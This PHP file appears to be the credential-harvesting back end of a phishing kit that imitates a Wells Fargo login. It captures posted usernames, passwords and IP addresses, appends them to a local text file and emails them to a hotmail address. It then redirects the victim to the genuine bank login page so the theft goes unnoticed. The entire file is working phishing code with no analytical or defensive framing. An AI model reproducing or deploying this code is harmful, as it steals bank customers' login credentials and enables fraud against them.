<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$send = "kerrymarley@hotmail.com, kerrymarley@hotmail.com";

$subject = "Wells Fargo Spaming ! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes/");

?>


